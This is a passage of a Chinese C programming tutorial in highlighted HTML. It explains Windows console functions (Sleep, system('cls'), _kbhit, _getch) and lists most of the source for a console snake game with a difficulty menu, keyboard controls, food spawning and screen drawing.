class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">change</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//改变变量值的子函数</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a=%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> m<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">*</span>m<span class="token operator">=</span><span class="token operator">*</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果为：</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;1a&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h3><h4 id="Sleep"><a href="#Sleep" class="headerlink" title="Sleep()"></a>Sleep()</h4><p>函数名：Sleep()</p><p>函数原型：void Sleep(DWORD dwMilliseconds);    参数单位为毫秒</p><p>功 能：执行挂起一段时间 　</p><p>所属头文件：#include &lt;windows.h&gt;  </p><p>（  在linux中使用#include &lt;unistd.h&gt;  ）</p><p><strong>在VC中,Sleep中的第一个英文字符为大写的”S” ,在linux下不要大写，在标准C中是sleep, 不要大写。</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//暂停3秒  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="system-“cls”"><a href="#system-“cls”" class="headerlink" title="system(“cls”)"></a>system(“cls”)</h4><p>函数名：system()</p><p>参数“cls”作用：执行清屏命令</p><p>所属头文件 #include &lt;windows.h&gt;</p><h4 id="kbhit"><a href="#kbhit" class="headerlink" title="_kbhit()"></a>_kbhit()</h4><p>函数名：_kbhit()   (VC++6.0的更早版本为kbhit() ）</p><p>函数原型：int kbhit(void);</p><p>功能：检查当前是否有键盘输入。</p><p>返回值：<strong>若有则返回一个非0值，否则返回 0</strong></p><p>所属头文件： #include &lt;conio.h&gt;</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">_kbhit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">//如果有输入则打印字符串 mark</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mark\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="getch"><a href="#getch" class="headerlink" title="_getch()"></a>_getch()</h4><p>函数名：_getch()   (VC++6.0的更早版本为getch() ）</p><p>函数原型：int getch(void)</p><p>功能：接受一个任意键的输入，<strong>不用按回车就返回，也不打印在屏幕上</strong></p><p>返回值：键入字符的ASCII值</p><p>所在头文件：#include&lt;conio.h&gt;</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">//根据键下的键来改变变量temp的值</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token char">'w'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'W'</span><span class="token operator">:</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token char">'a'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'A'</span><span class="token operator">:</span> temp <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'S'</span><span class="token operator">:</span> temp <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token char">'d'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'D'</span><span class="token operator">:</span> temp <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="贪吃蛇基本思路"><a href="#贪吃蛇基本思路" class="headerlink" title="贪吃蛇基本思路"></a>贪吃蛇基本思路</h2><p>地图空的位置用0表示，食物位置用-1来表示，蛇的位置用1、2、3、。。。来表示，<br>其中1代表蛇头，2代表紧接着蛇头的一节身体，3代表再下一节身体，以此类推。</p><p>具体过程：</p><p>1.初始化游戏，包括初始化地图，食物的位置，蛇的位置<br>2.获取玩家输入的控制命令<br>3.根据输入的控制命令移动蛇的位置（左转、右转还是方向不变），并且返回移动的结果（是吃到食物，还是撞到障碍物，还是其他）<br>4.分析移动的结果，如果是吃到了食物，分数加一，撞到了障碍物结束游戏。<br>5.将蛇画到控制台<br>6.回到2过程</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;time.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;conio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIZE</span> <span class="token expression"><span class="token number">15</span>    </span><span class="token comment">//地图大小</span></span><span class="token keyword">int</span> <span class="token function">begin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//开始界面</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> command<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> length<span class="token punctuation">,</span> <span class="token keyword">int</span> map<span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//初始化地图（初始化地图，食物的位置，蛇的位置）</span><span class="token keyword">int</span> <span class="token function">getcommand</span><span class="token punctuation">(</span><span class="token keyword">int</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//获取命令</span><span class="token keyword">int</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">int</span> command<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> length<span class="token punctuation">,</span> <span class="token keyword">int</span> map<span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">*</span> sore<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//移动蛇</span><span class="token keyword">void</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token keyword">int</span> map<span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//画出蛇</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span><span class="token keyword">int</span> map<span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token comment">//创建地图</span><span class="token keyword">int</span> command<span class="token punctuation">,</span> result<span class="token punctuation">,</span> length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">//初始化长度为0</span><span class="token keyword">int</span> s <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> sore <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>s <span class="token operator">=</span> <span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//开始界面</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>command<span class="token punctuation">,</span> <span class="token operator">&amp;</span>length<span class="token punctuation">,</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//初始化地图（初始化地图，食物的位置，蛇的位置）</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>command <span class="token operator">=</span> <span class="token function">getcommand</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token function">move</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token operator">&amp;</span>length<span class="token punctuation">,</span> map<span class="token punctuation">,</span><span class="token operator">&amp;</span>sore<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">//失败</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token function">draw</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//画出结果</span>        <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nOVER!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"得分：%d\n"</span><span class="token punctuation">,</span>sore<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">begin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_kbhit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token char">'w'</span><span class="token operator">:</span>id <span class="token operator">=</span> id <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span>id <span class="token operator">=</span> id <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'a'</span><span class="token operator">:</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'d'</span><span class="token operator">:</span>flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span>id <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span>id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     请选择难度:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     (使用‘w’和‘s’控制难度，按‘a’或‘d’确定)\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   -->"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t困难\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   -->"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t一般\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"   -->"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t简单\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n  Power by Mark0519\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> id<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> command<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> length<span class="token punctuation">,</span> <span class="token keyword">int</span> map<span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>command <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">//初始化蛇移动方向向下</span><span class="token operator">*</span>length <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">//初始化蛇的长度为3</span><span class="token comment">//初始化整条蛇的位置</span>map<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">//蛇头位置</span>map<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>map<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token comment">//蛇尾位置</span><span class="token comment">//初始化食物的位置</span>map<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">//-1代表食物</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">getcommand</span><span class="token punctuation">(</span><span class="token keyword">int</span> command<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_kbhit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果键盘有输入             </span><span class="token punctuation">&#123;</span>        <span class="token comment">/*              0              ↑   3 ←     → 1       ↓              2*/</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">//操控蛇的输入的字符</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token char">'w'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'W'</span><span class="token operator">:</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">//向上为0</span><span class="token keyword">case</span> <span class="token char">'a'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'A'</span><span class="token operator">:</span> temp <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">//向左为3</span><span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'S'</span><span class="token operator">:</span> temp <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">//向下为2</span><span class="token keyword">case</span> <span class="token char">'d'</span><span class="token operator">:</span><span class="token keyword">case</span> <span class="token char">'D'</span><span class="token operator">:</span> temp <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">//向右为1</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token function">abs</span><span class="token punctuation">(</span>command <span class="token operator">-</span> temp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment">//蛇不能反向</span><span class="token punctuation">&#123;</span>command <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> command<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">int</span> command<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> length<span class="token punctuation">,</span> <span class="token keyword">int</span> map<span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">*</span> sore<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> head_i<span class="token punctuation">,</span> head_j<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SIZE<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">*</span>length<span class="token punctuation">)</span> <span class="token comment">//如果是蛇的最后一节身体</span><span class="token punctuation">&#123;</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//如果是蛇中间节的身体</span><span class="token punctuation">&#123;</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//如果是蛇头</span><span class="token punctuation">&#123;</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//确定蛇头新的位置head_i和head_j</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span> head_i <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> head_j <span class="token operator">=</span> j<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span> head_i <span class="token operator">=</span> i<span class="token punctuation">,</span> head_j <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span> head_i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> head_j <span class="token operator">=</span> j<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span> head_i <span class="token operator">=</span> i<span class="token punctuation">,</span> head_j <span class="token operator">=</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//判断移动结果</span><span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>head_i<span class="token punctuation">]</span><span class="token punctuation">[</span>head_j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//如果吃到了食物</span><span class="token punctuation">&#123;</span><span class="token operator">*</span>sore <span class="token operator">=</span> <span class="token operator">*</span>sore <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>map<span class="token punctuation">[</span>head_i<span class="token punctuation">]</span><span class="token punctuation">[</span>head_j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">*</span>length <span class="token operator">=</span> <span class="token operator">*</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//蛇的长度加一</span><span class="token comment">//重新生成食物</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置种子</span>i <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> SIZE<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> SIZE<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>head_i<span class="token punctuation">]</span><span class="token punctuation">[</span>head_j<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> head_i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> head_i <span class="token operator">==</span> SIZE <span class="token operator">||</span> head_j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> head_j <span class="token operator">==</span> SIZE<span class="token punctuation">)</span><span class="token comment">//撞墙或撞自己</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//失败</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>map<span class="token punctuation">[</span>head_i<span class="token punctuation">]</span><span class="token punctuation">[</span>head_j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//成功</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token keyword">int</span> map<span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//清屏</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\t    难度："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" 困难\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" 一般\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" 简单\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出上边框</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token 